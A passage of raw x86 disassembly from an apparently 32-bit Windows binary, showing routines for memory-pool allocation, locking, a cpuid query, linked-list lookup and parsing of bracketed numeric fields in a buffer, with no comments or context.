  40379d:	c2 04 00             	ret    $0x4
  4037a0:	55                   	push   %ebp
  4037a1:	8b ec                	mov    %esp,%ebp
  4037a3:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4037a7:	77 0c                	ja     0x4037b5
  4037a9:	83 7d 0c 1e          	cmpl   $0x1e,0xc(%ebp)
  4037ad:	77 06                	ja     0x4037b5
  4037af:	32 c0                	xor    %al,%al
  4037b1:	5d                   	pop    %ebp
  4037b2:	c2 10 00             	ret    $0x10
  4037b5:	6a 1e                	push   $0x1e
  4037b7:	ff 75 14             	push   0x14(%ebp)
  4037ba:	ff 75 08             	push   0x8(%ebp)
  4037bd:	e8 4e 15 00 00       	call   0x404d10
  4037c2:	85 c0                	test   %eax,%eax
  4037c4:	0f 95 c0             	setne  %al
  4037c7:	5d                   	pop    %ebp
  4037c8:	c2 10 00             	ret    $0x10
  4037cb:	cc                   	int3
  4037cc:	cc                   	int3
  4037cd:	cc                   	int3
  4037ce:	cc                   	int3
  4037cf:	cc                   	int3
  4037d0:	55                   	push   %ebp
  4037d1:	8b ec                	mov    %esp,%ebp
  4037d3:	51                   	push   %ecx
  4037d4:	68 90 e8 40 00       	push   $0x40e890
  4037d9:	ff 15 f8 70 40 00    	call   *0x4070f8
  4037df:	68 88 e8 40 00       	push   $0x40e888
  4037e4:	88 45 fc             	mov    %al,-0x4(%ebp)
  4037e7:	e8 a4 e9 ff ff       	call   0x402190
  4037ec:	ff 75 fc             	push   -0x4(%ebp)
  4037ef:	68 90 e8 40 00       	push   $0x40e890
  4037f4:	ff 15 fc 70 40 00    	call   *0x4070fc
  4037fa:	a1 50 cc 40 00       	mov    0x40cc50,%eax
  4037ff:	85 c0                	test   %eax,%eax
  403801:	74 0c                	je     0x40380f
  403803:	68 51 61 78 58       	push   $0x58786151
  403808:	50                   	push   %eax
  403809:	ff 15 ac 71 40 00    	call   *0x4071ac
  40380f:	a1 54 cc 40 00       	mov    0x40cc54,%eax
  403814:	85 c0                	test   %eax,%eax
  403816:	74 0c                	je     0x403824
  403818:	68 51 61 78 58       	push   $0x58786151
  40381d:	50                   	push   %eax
  40381e:	ff 15 ac 71 40 00    	call   *0x4071ac
  403824:	8b e5                	mov    %ebp,%esp
  403826:	5d                   	pop    %ebp
  403827:	c3                   	ret
  403828:	cc                   	int3
  403829:	cc                   	int3
  40382a:	cc                   	int3
  40382b:	cc                   	int3
  40382c:	cc                   	int3
  40382d:	cc                   	int3
  40382e:	cc                   	int3
  40382f:	cc                   	int3
  403830:	55                   	push   %ebp
  403831:	8b ec                	mov    %esp,%ebp
  403833:	8b 45 08             	mov    0x8(%ebp),%eax
  403836:	83 f8 04             	cmp    $0x4,%eax
  403839:	77 0c                	ja     0x403847
  40383b:	c1 e0 09             	shl    $0x9,%eax
  40383e:	05 80 de 40 00       	add    $0x40de80,%eax
  403843:	5d                   	pop    %ebp
  403844:	c2 04 00             	ret    $0x4
  403847:	33 c0                	xor    %eax,%eax
  403849:	5d                   	pop    %ebp
  40384a:	c2 04 00             	ret    $0x4
  40384d:	cc                   	int3
  40384e:	cc                   	int3
  40384f:	cc                   	int3
  403850:	55                   	push   %ebp
  403851:	8b ec                	mov    %esp,%ebp
  403853:	83 ec 10             	sub    $0x10,%esp
  403856:	53                   	push   %ebx
  403857:	56                   	push   %esi
  403858:	57                   	push   %edi
  403859:	b8 01 00 00 00       	mov    $0x1,%eax
  40385e:	8d 7d f0             	lea    -0x10(%ebp),%edi
  403861:	33 c9                	xor    %ecx,%ecx
  403863:	53                   	push   %ebx
  403864:	0f a2                	cpuid
  403866:	8b f3                	mov    %ebx,%esi
  403868:	5b                   	pop    %ebx
  403869:	89 07                	mov    %eax,(%edi)
  40386b:	89 77 04             	mov    %esi,0x4(%edi)
  40386e:	89 4f 08             	mov    %ecx,0x8(%edi)
  403871:	89 57 0c             	mov    %edx,0xc(%edi)
  403874:	ff 75 f0             	push   -0x10(%ebp)
  403877:	ff 75 fc             	push   -0x4(%ebp)
  40387a:	68 98 6d 40 00       	push   $0x406d98
  40387f:	68 60 de 40 00       	push   $0x40de60
  403884:	e8 5a 30 00 00       	call   0x4068e3
  403889:	83 c4 10             	add    $0x10,%esp
  40388c:	68 88 e8 40 00       	push   $0x40e888
  403891:	e8 4a e9 ff ff       	call   0x4021e0
  403896:	8b 45 08             	mov    0x8(%ebp),%eax
  403899:	5f                   	pop    %edi
  40389a:	5e                   	pop    %esi
  40389b:	a3 80 e8 40 00       	mov    %eax,0x40e880
  4038a0:	5b                   	pop    %ebx
  4038a1:	8b e5                	mov    %ebp,%esp
  4038a3:	5d                   	pop    %ebp
  4038a4:	c2 04 00             	ret    $0x4
  4038a7:	cc                   	int3
  4038a8:	cc                   	int3
  4038a9:	cc                   	int3
  4038aa:	cc                   	int3
  4038ab:	cc                   	int3
  4038ac:	cc                   	int3
  4038ad:	cc                   	int3
  4038ae:	cc                   	int3
  4038af:	cc                   	int3
  4038b0:	55                   	push   %ebp
  4038b1:	8b ec                	mov    %esp,%ebp
  4038b3:	83 ec 0c             	sub    $0xc,%esp
  4038b6:	53                   	push   %ebx
  4038b7:	56                   	push   %esi
  4038b8:	68 90 e8 40 00       	push   $0x40e890
  4038bd:	33 db                	xor    %ebx,%ebx
  4038bf:	ff 15 f8 70 40 00    	call   *0x4070f8
  4038c5:	68 88 e8 40 00       	push   $0x40e888
  4038ca:	88 45 f8             	mov    %al,-0x8(%ebp)
  4038cd:	ff 15 c8 70 40 00    	call   *0x4070c8
  4038d3:	84 c0                	test   %al,%al
  4038d5:	74 64                	je     0x40393b
  4038d7:	39 1d 8c e8 40 00    	cmp    %ebx,0x40e88c
  4038dd:	74 5c                	je     0x40393b
  4038df:	8b 35 88 e8 40 00    	mov    0x40e888,%esi
  4038e5:	85 f6                	test   %esi,%esi
  4038e7:	74 52                	je     0x40393b
  4038e9:	81 fe 88 e8 40 00    	cmp    $0x40e888,%esi
  4038ef:	74 4a                	je     0x40393b
  4038f1:	57                   	push   %edi
  4038f2:	8b 7d 08             	mov    0x8(%ebp),%edi
  4038f5:	85 f6                	test   %esi,%esi
  4038f7:	74 1a                	je     0x403913
  4038f9:	56                   	push   %esi
  4038fa:	ff 15 c8 70 40 00    	call   *0x4070c8
  403900:	84 c0                	test   %al,%al
  403902:	74 05                	je     0x403909
  403904:	39 7e 08             	cmp    %edi,0x8(%esi)
  403907:	74 2a                	je     0x403933
  403909:	8b 36                	mov    (%esi),%esi
  40390b:	81 fe 88 e8 40 00    	cmp    $0x40e888,%esi
  403911:	75 e2                	jne    0x4038f5
  403913:	33 f6                	xor    %esi,%esi
  403915:	5f                   	pop    %edi
  403916:	ff 75 f8             	push   -0x8(%ebp)
  403919:	68 90 e8 40 00       	push   $0x40e890
  40391e:	ff 15 fc 70 40 00    	call   *0x4070fc
  403924:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403927:	8b c3                	mov    %ebx,%eax
  403929:	89 31                	mov    %esi,(%ecx)
  40392b:	5e                   	pop    %esi
  40392c:	5b                   	pop    %ebx
  40392d:	8b e5                	mov    %ebp,%esp
  40392f:	5d                   	pop    %ebp
  403930:	c2 08 00             	ret    $0x8
  403933:	8b 5e 0c             	mov    0xc(%esi),%ebx
  403936:	8b 76 10             	mov    0x10(%esi),%esi
  403939:	eb da                	jmp    0x403915
  40393b:	33 f6                	xor    %esi,%esi
  40393d:	eb d7                	jmp    0x403916
  40393f:	cc                   	int3
  403940:	55                   	push   %ebp
  403941:	8b ec                	mov    %esp,%ebp
  403943:	83 ec 24             	sub    $0x24,%esp
  403946:	33 c0                	xor    %eax,%eax
  403948:	53                   	push   %ebx
  403949:	33 db                	xor    %ebx,%ebx
  40394b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40394e:	56                   	push   %esi
  40394f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403952:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403955:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403958:	39 05 80 e8 40 00    	cmp    %eax,0x40e880
  40395e:	0f 84 36 02 00 00    	je     0x403b9a
  403964:	38 05 80 e0 40 00    	cmp    %al,0x40e080
  40396a:	0f 84 2a 02 00 00    	je     0x403b9a
  403970:	80 3d 84 e8 40 00 01 	cmpb   $0x1,0x40e884
  403977:	0f 84 1d 02 00 00    	je     0x403b9a
  40397d:	b9 00 08 00 00       	mov    $0x800,%ecx
  403982:	b8 60 d6 40 00       	mov    $0x40d660,%eax
  403987:	88 18                	mov    %bl,(%eax)
  403989:	8d 40 01             	lea    0x1(%eax),%eax
  40398c:	83 e9 01             	sub    $0x1,%ecx
  40398f:	75 f6                	jne    0x403987
  403991:	68 00 08 00 00       	push   $0x800
  403996:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403999:	e8 42 2e 00 00       	call   0x4067e0
  40399e:	84 c0                	test   %al,%al
  4039a0:	0f 84 f4 01 00 00    	je     0x403b9a
  4039a6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4039a9:	50                   	push   %eax
  4039aa:	68 80 e0 40 00       	push   $0x40e080
  4039af:	e8 dc 1e 00 00       	call   0x405890
  4039b4:	84 c0                	test   %al,%al
  4039b6:	0f 84 de 01 00 00    	je     0x403b9a
  4039bc:	6a 03                	push   $0x3
  4039be:	e8 6d e1 ff ff       	call   0x401b30
  4039c3:	50                   	push   %eax
  4039c4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039c7:	e8 94 2e 00 00       	call   0x406860
  4039cc:	6a 00                	push   $0x0
  4039ce:	50                   	push   %eax
  4039cf:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039d2:	e8 a9 2d 00 00       	call   0x406780
  4039d7:	50                   	push   %eax
  4039d8:	e8 c3 fd ff ff       	call   0x4037a0
  4039dd:	84 c0                	test   %al,%al
  4039df:	0f 84 b5 01 00 00    	je     0x403b9a
  4039e5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039e8:	e8 73 2e 00 00       	call   0x406860
  4039ed:	6a 00                	push   $0x0
  4039ef:	50                   	push   %eax
  4039f0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039f3:	e8 88 2d 00 00       	call   0x406780
  4039f8:	50                   	push   %eax
  4039f9:	e8 22 1e 00 00       	call   0x405820
  4039fe:	8b f0                	mov    %eax,%esi
  403a00:	85 f6                	test   %esi,%esi
  403a02:	0f 84 92 01 00 00    	je     0x403b9a
  403a08:	8a 06                	mov    (%esi),%al
  403a0a:	84 c0                	test   %al,%al
  403a0c:	0f 84 49 01 00 00    	je     0x403b5b
  403a12:	57                   	push   %edi
  403a13:	3c 5b                	cmp    $0x5b,%al
  403a15:	75 54                	jne    0x403a6b
  403a17:	8a 46 01             	mov    0x1(%esi),%al
  403a1a:	46                   	inc    %esi
  403a1b:	33 ff                	xor    %edi,%edi
  403a1d:	33 db                	xor    %ebx,%ebx
  403a1f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403a22:	3c 2d                	cmp    $0x2d,%al
  403a24:	74 22                	je     0x403a48
  403a26:	8a d0                	mov    %al,%dl
  403a28:	8a c2                	mov    %dl,%al
  403a2a:	80 fa 5d             	cmp    $0x5d,%dl
  403a2d:	74 15                	je     0x403a44
  403a2f:	0f be c2             	movsbl %dl,%eax
  403a32:	8d 1c 9b             	lea    (%ebx,%ebx,4),%ebx
  403a35:	46                   	inc    %esi
  403a36:	8d 5b e8             	lea    -0x18(%ebx),%ebx
  403a39:	8d 1c 58             	lea    (%eax,%ebx,2),%ebx
  403a3c:	8a 06                	mov    (%esi),%al
  403a3e:	8a d0                	mov    %al,%dl
  403a40:	3c 2d                	cmp    $0x2d,%al
  403a42:	75 e4                	jne    0x403a28
  403a44:	3c 2d                	cmp    $0x2d,%al
  403a46:	75 23                	jne    0x403a6b
  403a48:	8a 46 01             	mov    0x1(%esi),%al
  403a4b:	46                   	inc    %esi
  403a4c:	3c 5d                	cmp    $0x5d,%al
  403a4e:	74 1b                	je     0x403a6b
  403a50:	0f be c0             	movsbl %al,%eax
  403a53:	8d 3c bf             	lea    (%edi,%edi,4),%edi
  403a56:	46                   	inc    %esi
  403a57:	8d 7f e8             	lea    -0x18(%edi),%edi
  403a5a:	8d 3c 78             	lea    (%eax,%edi,2),%edi
  403a5d:	8a 06                	mov    (%esi),%al
  403a5f:	3c 5d                	cmp    $0x5d,%al
  403a61:	75 ed                	jne    0x403a50
  403a63:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403a66:	e9 e3 00 00 00       	jmp    0x403b4e
  403a6b:	3c 7b                	cmp    $0x7b,%al
  403a6d:	0f 85 db 00 00 00    	jne    0x403b4e
  403a73:	46                   	inc    %esi
  403a74:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  403a7b:	0f 85 cd 00 00 00    	jne    0x403b4e
  403a81:	8a 06                	mov    (%esi),%al
  403a83:	33 ff                	xor    %edi,%edi
  403a85:	3c 7c                	cmp    $0x7c,%al
  403a87:	74 1e                	je     0x403aa7
  403a89:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403a90:	3c 7d                	cmp    $0x7d,%al
  403a92:	74 13                	je     0x403aa7
  403a94:	0f be c0             	movsbl %al,%eax
  403a97:	8d 3c bf             	lea    (%edi,%edi,4),%edi
  403a9a:	46                   	inc    %esi
  403a9b:	8d 7f e8             	lea    -0x18(%edi),%edi
  403a9e:	8d 3c 78             	lea    (%eax,%edi,2),%edi
  403aa1:	8a 06                	mov    (%esi),%al
  403aa3:	3c 7c                	cmp    $0x7c,%al
  403aa5:	75 e9                	jne    0x403a90
  403aa7:	85 db                	test   %ebx,%ebx
  403aa9:	0f 84 8c 00 00 00    	je     0x403b3b
  403aaf:	6a 14                	push   $0x14
  403ab1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403ab4:	6a 00                	push   $0x0
  403ab6:	50                   	push   %eax
  403ab7:	e8 14 2e 00 00       	call   0x4068d0
  403abc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403abf:	83 c4 0c             	add    $0xc,%esp
  403ac2:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  403ac5:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  403ac8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403acb:	68 88 e8 40 00       	push   $0x40e888
  403ad0:	ff 15 c8 70 40 00    	call   *0x4070c8
  403ad6:	84 c0                	test   %al,%al
  403ad8:	74 61                	je     0x403b3b
  403ada:	83 3d 8c e8 40 00 00 	cmpl   $0x0,0x40e88c
  403ae1:	74 58                	je     0x403b3b
  403ae3:	83 3d 88 e8 40 00 00 	cmpl   $0x0,0x40e888
  403aea:	74 4f                	je     0x403b3b
  403aec:	68 78 61 64 76       	push   $0x76646178
  403af1:	6a 14                	push   $0x14
  403af3:	6a 00                	push   $0x0
  403af5:	ff 15 f4 70 40 00    	call   *0x4070f4
  403afb:	8b f8                	mov    %eax,%edi
  403afd:	85 ff                	test   %edi,%edi
  403aff:	74 3a                	je     0x403b3b
  403b01:	57                   	push   %edi
  403b02:	ff 15 c8 70 40 00    	call   *0x4070c8
  403b08:	84 c0                	test   %al,%al
  403b0a:	74 2f                	je     0x403b3b
  403b0c:	6a 14                	push   $0x14
  403b0e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403b11:	50                   	push   %eax
  403b12:	57                   	push   %edi
  403b13:	e8 b2 2d 00 00       	call   0x4068ca
  403b18:	a1 88 e8 40 00       	mov    0x40e888,%eax
  403b1d:	83 c4 0c             	add    $0xc,%esp
  403b20:	81 78 04 88 e8 40 00 	cmpl   $0x40e888,0x4(%eax)
  403b27:	75 6a                	jne    0x403b93
  403b29:	89 07                	mov    %eax,(%edi)
  403b2b:	c7 47 04 88 e8 40 00 	movl   $0x40e888,0x4(%edi)
  403b32:	89 78 04             	mov    %edi,0x4(%eax)
  403b35:	89 3d 88 e8 40 00    	mov    %edi,0x40e888
  403b3b:	80 3e 7d             	cmpb   $0x7d,(%esi)
  403b3e:	74 0e                	je     0x403b4e
  403b40:	46                   	inc    %esi
  403b41:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  403b48:	0f 84 33 ff ff ff    	je     0x403a81
  403b4e:	8a 46 01             	mov    0x1(%esi),%al
  403b51:	46                   	inc    %esi
  403b52:	84 c0                	test   %al,%al
  403b54:	0f 85 b9 fe ff ff    	jne    0x403a13
  403b5a:	5f                   	pop    %edi
  403b5b:	a0 04 a8 40 00       	mov    0x40a804,%al
  403b60:	84 c0                	test   %al,%al
  403b62:	0f 94 05 84 e8 40 00 	sete   0x40e884
  403b69:	84 c0                	test   %al,%al
  403b6b:	75 0c                	jne    0x403b79
  403b6d:	b8 01 00 00 00       	mov    $0x1,%eax
  403b72:	b9 1c a8 40 00       	mov    $0x40a81c,%ecx
  403b77:	87 01                	xchg   %eax,(%ecx)
  403b79:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  403b80:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403b83:	0f 94 c3             	sete   %bl
  403b86:	e8 25 2c 00 00       	call   0x4067b0
  403b8b:	5e                   	pop    %esi
  403b8c:	8a c3                	mov    %bl,%al
  403b8e:	5b                   	pop    %ebx
  403b8f:	8b e5                	mov    %ebp,%esp
  403b91:	5d                   	pop    %ebp
  403b92:	c3                   	ret
  403b93:	b9 03 00 00 00       	mov    $0x3,%ecx
  403b98:	cd 29                	int    $0x29
  403b9a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403b9d:	32 db                	xor    %bl,%bl
  403b9f:	e8 0c 2c 00 00       	call   0x4067b0
  403ba4:	5e                   	pop    %esi
  403ba5:	8a c3                	mov    %bl,%al
  403ba7:	5b                   	pop    %ebx
  403ba8:	8b e5                	mov    %ebp,%esp
  403baa:	5d                   	pop    %ebp
  403bab:	c3                   	ret
  403bac:	cc                   	int3
  403bad:	cc                   	int3
  403bae:	cc                   	int3
  403baf:	cc                   	int3
  403bb0:	55                   	push   %ebp
  403bb1:	8b ec                	mov    %esp,%ebp
  403bb3:	81 ec 18 03 00 00    	sub    $0x318,%esp
  403bb9:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  403bbe:	33 c5                	xor    %ebp,%eax
  403bc0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403bc3:	53                   	push   %ebx
  403bc4:	56                   	push   %esi
  403bc5:	8b 75 08             	mov    0x8(%ebp),%esi
  403bc8:	33 c0                	xor    %eax,%eax
  403bca:	68 00 01 00 00       	push   $0x100
  403bcf:	50                   	push   %eax
  403bd0:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
  403bd6:	89 85 f4 fc ff ff    	mov    %eax,-0x30c(%ebp)
  403bdc:	89 85 f8 fc ff ff    	mov    %eax,-0x308(%ebp)
  403be2:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403be8:	50                   	push   %eax
  403be9:	e8 e2 2c 00 00       	call   0x4068d0
  403bee:	83 c4 0c             	add    $0xc,%esp
  403bf1:	83 3d 80 e8 40 00 00 	cmpl   $0x0,0x40e880
  403bf8:	0f 84 93 01 00 00    	je     0x403d91
  403bfe:	80 3d 98 e8 40 00 00 	cmpb   $0x0,0x40e898
  403c05:	74 16                	je     0x403c1d
  403c07:	68 98 e8 40 00       	push   $0x40e898
  403c0c:	56                   	push   %esi
  403c0d:	e8 01 2d 00 00       	call   0x406913
  403c12:	83 c4 08             	add    $0x8,%esp
  403c15:	85 c0                	test   %eax,%eax
  403c17:	0f 84 74 01 00 00    	je     0x403d91
  403c1d:	56                   	push   %esi
  403c1e:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403c24:	50                   	push   %eax
  403c25:	e8 16 06 00 00       	call   0x404240
  403c2a:	84 c0                	test   %al,%al
  403c2c:	0f 85 5f 01 00 00    	jne    0x403d91
  403c32:	38 85 fc fe ff ff    	cmp    %al,-0x104(%ebp)
  403c38:	0f 84 53 01 00 00    	je     0x403d91
  403c3e:	68 00 28 00 00       	push   $0x2800
  403c43:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403c49:	e8 92 2b 00 00       	call   0x4067e0
  403c4e:	84 c0                	test   %al,%al
  403c50:	0f 84 3b 01 00 00    	je     0x403d91
  403c56:	8d 85 f0 fc ff ff    	lea    -0x310(%ebp),%eax
  403c5c:	50                   	push   %eax
  403c5d:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403c63:	50                   	push   %eax
  403c64:	e8 27 1c 00 00       	call   0x405890
  403c69:	84 c0                	test   %al,%al
  403c6b:	0f 84 20 01 00 00    	je     0x403d91
  403c71:	6a 03                	push   $0x3
  403c73:	e8 b8 de ff ff       	call   0x401b30
  403c78:	50                   	push   %eax
  403c79:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403c7f:	e8 dc 2b 00 00       	call   0x406860
  403c84:	6a 00                	push   $0x0
  403c86:	50                   	push   %eax
  403c87:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403c8d:	e8 ee 2a 00 00       	call   0x406780
  403c92:	50                   	push   %eax
  403c93:	e8 08 fb ff ff       	call   0x4037a0
  403c98:	84 c0                	test   %al,%al
  403c9a:	0f 84 f1 00 00 00    	je     0x403d91
  403ca0:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403ca6:	e8 b5 2b 00 00       	call   0x406860
  403cab:	6a 00                	push   $0x0
  403cad:	50                   	push   %eax
  403cae:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403cb4:	e8 c7 2a 00 00       	call   0x406780
  403cb9:	50                   	push   %eax
  403cba:	e8 61 1b 00 00       	call   0x405820
  403cbf:	8b d8                	mov    %eax,%ebx
  403cc1:	85 db                	test   %ebx,%ebx
  403cc3:	0f 84 c8 00 00 00    	je     0x403d91
  403cc9:	68 ff 00 00 00       	push   $0xff
  403cce:	6a 00                	push   $0x0
  403cd0:	68 98 e8 40 00       	push   $0x40e898
  403cd5:	e8 f6 2b 00 00       	call   0x4068d0
  403cda:	83 c4 0c             	add    $0xc,%esp
  403cdd:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403ce3:	e8 78 2b 00 00       	call   0x406860
  403ce8:	8b f0                	mov    %eax,%esi
  403cea:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403cf0:	68 98 e8 40 00       	push   $0x40e898
  403cf5:	2b f3                	sub    %ebx,%esi
  403cf7:	e8 84 2a 00 00       	call   0x406780
  403cfc:	03 c6                	add    %esi,%eax
  403cfe:	50                   	push   %eax
  403cff:	53                   	push   %ebx
  403d00:	e8 eb e7 ff ff       	call   0x4024f0
  403d05:	68 98 e8 40 00       	push   $0x40e898
  403d0a:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403d10:	50                   	push   %eax
  403d11:	e8 2a 05 00 00       	call   0x404240
  403d16:	3c 01                	cmp    $0x1,%al
  403d18:	75 77                	jne    0x403d91
  403d1a:	57                   	push   %edi
  403d1b:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403d21:	e8 3a 2b 00 00       	call   0x406860
  403d26:	8b f8                	mov    %eax,%edi
  403d28:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403d2e:	2b fb                	sub    %ebx,%edi
  403d30:	e8 4b 2a 00 00       	call   0x406780
  403d35:	68 00 02 00 00       	push   $0x200
  403d3a:	03 f8                	add    %eax,%edi
  403d3c:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  403d42:	6a 00                	push   $0x0
  403d44:	50                   	push   %eax
  403d45:	e8 86 2b 00 00       	call   0x4068d0
  403d4a:	83 c4 0c             	add    $0xc,%esp
  403d4d:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  403d53:	68 00 02 00 00       	push   $0x200
  403d58:	50                   	push   %eax
  403d59:	e8 d2 da ff ff       	call   0x401830
  403d5e:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  403d64:	50                   	push   %eax
  403d65:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  403d6b:	50                   	push   %eax
  403d6c:	ff 15 b0 71 40 00    	call   *0x4071b0
  403d72:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  403d78:	50                   	push   %eax
  403d79:	e8 12 de ff ff       	call   0x401b90
  403d7e:	57                   	push   %edi
  403d7f:	53                   	push   %ebx
  403d80:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  403d86:	50                   	push   %eax
  403d87:	e8 84 e2 ff ff       	call   0x402010
  403d8c:	b3 01                	mov    $0x1,%bl
  403d8e:	5f                   	pop    %edi
  403d8f:	eb 02                	jmp    0x403d93
  403d91:	32 db                	xor    %bl,%bl
  403d93:	8d 8d f0 fc ff ff    	lea    -0x310(%ebp),%ecx
  403d99:	e8 12 2a 00 00       	call   0x4067b0
  403d9e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403da1:	8a c3                	mov    %bl,%al
  403da3:	5e                   	pop    %esi
  403da4:	33 cd                	xor    %ebp,%ecx
  403da6:	5b                   	pop    %ebx
  403da7:	e8 ca 2e 00 00       	call   0x406c76
  403dac:	8b e5                	mov    %ebp,%esp
  403dae:	5d                   	pop    %ebp
  403daf:	c2 04 00             	ret    $0x4
  403db2:	cc                   	int3
  403db3:	cc                   	int3
  403db4:	cc                   	int3
  403db5:	cc                   	int3
  403db6:	cc                   	int3
  403db7:	cc                   	int3
  403db8:	cc                   	int3
  403db9:	cc                   	int3
  403dba:	cc                   	int3
  403dbb:	cc                   	int3
  403dbc:	cc                   	int3
  403dbd:	cc                   	int3
  403dbe:	cc                   	int3
  403dbf:	cc                   	int3
  403dc0:	55                   	push   %ebp
  403dc1:	8b ec                	mov    %esp,%ebp
  403dc3:	a1 50 cc 40 00       	mov    0x40cc50,%eax
  403dc8:	83 ec 08             	sub    $0x8,%esp
  403dcb:	56                   	push   %esi
  403dcc:	33 f6                	xor    %esi,%esi
  403dce:	57                   	push   %edi
  403dcf:	85 c0                	test   %eax,%eax
  403dd1:	75 1f                	jne    0x403df2
  403dd3:	68 51 61 78 58       	push   $0x58786151
  403dd8:	68 00 00 02 00       	push   $0x20000
  403ddd:	6a 01                	push   $0x1
  403ddf:	ff 15 f4 70 40 00    	call   *0x4070f4
  403de5:	a3 50 cc 40 00       	mov    %eax,0x40cc50
  403dea:	85 c0                	test   %eax,%eax
  403dec:	0f 84 fe 01 00 00    	je     0x403ff0
  403df2:	80 3d 60 d0 40 00 00 	cmpb   $0x0,0x40d060
  403df9:	0f 85 f1 01 00 00    	jne    0x403ff0
  403dff:	39 35 54 cc 40 00    	cmp    %esi,0x40cc54
  403e05:	0f 85 e5 01 00 00    	jne    0x403ff0
  403e0b:	39 35 5c cc 40 00    	cmp    %esi,0x40cc5c
  403e11:	0f 85 d9 01 00 00    	jne    0x403ff0
  403e17:	80 3d 80 e4 40 00 00 	cmpb   $0x0,0x40e480
  403e1e:	0f 84 cc 01 00 00    	je     0x403ff0
  403e24:	b9 00 00 02 00       	mov    $0x20000,%ecx
  403e29:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403e30:	c6 00 00             	movb   $0x0,(%eax)
  403e33:	8d 40 01             	lea    0x1(%eax),%eax
  403e36:	83 e9 01             	sub    $0x1,%ecx
  403e39:	75 f5                	jne    0x403e30
  403e3b:	b9 00 02 00 00       	mov    $0x200,%ecx
  403e40:	b8 60 d0 40 00       	mov    $0x40d060,%eax
  403e45:	c6 00 00             	movb   $0x0,(%eax)
  403e48:	8d 40 01             	lea    0x1(%eax),%eax
  403e4b:	83 e9 01             	sub    $0x1,%ecx
  403e4e:	75 f5                	jne    0x403e45
  403e50:	a1 50 cc 40 00       	mov    0x40cc50,%eax
  403e55:	51                   	push   %ecx
  403e56:	68 00 00 02 00       	push   $0x20000
  403e5b:	50                   	push   %eax
  403e5c:	68 80 e4 40 00       	push   $0x40e480
  403e61:	e8 ba 1c 00 00       	call   0x405b20
  403e66:	84 c0                	test   %al,%al
  403e68:	0f 84 82 01 00 00    	je     0x403ff0
  403e6e:	6a 03                	push   $0x3
  403e70:	e8 bb dc ff ff       	call   0x401b30
  403e75:	8b 0d 50 cc 40 00    	mov    0x40cc50,%ecx
  403e7b:	6a 1e                	push   $0x1e
  403e7d:	50                   	push   %eax
  403e7e:	51                   	push   %ecx
  403e7f:	e8 8c 0e 00 00       	call   0x404d10
  403e84:	85 c0                	test   %eax,%eax
  403e86:	0f 84 64 01 00 00    	je     0x403ff0
  403e8c:	a1 50 cc 40 00       	mov    0x40cc50,%eax
  403e91:	6a 00                	push   $0x0
  403e93:	68 00 00 02 00       	push   $0x20000
  403e98:	50                   	push   %eax
  403e99:	e8 82 19 00 00       	call   0x405820
  403e9e:	85 c0                	test   %eax,%eax
  403ea0:	0f 84 4a 01 00 00    	je     0x403ff0
  403ea6:	68 00 00 02 00       	push   $0x20000
  403eab:	68 a2 6d 40 00       	push   $0x406da2
  403eb0:	50                   	push   %eax
  403eb1:	e8 5a 0e 00 00       	call   0x404d10
  403eb6:	68 00 00 02 00       	push   $0x20000
  403ebb:	68 a4 6d 40 00       	push   $0x406da4
  403ec0:	50                   	push   %eax
  403ec1:	8d 48 01             	lea    0x1(%eax),%ecx
  403ec4:	89 0d 5c cc 40 00    	mov    %ecx,0x40cc5c
  403eca:	e8 41 0e 00 00       	call   0x404d10
  403ecf:	68 00 00 02 00       	push   $0x20000
  403ed4:	68 a6 6d 40 00       	push   $0x406da6
  403ed9:	c6 00 00             	movb   $0x0,(%eax)
  403edc:	40                   	inc    %eax
  403edd:	50                   	push   %eax
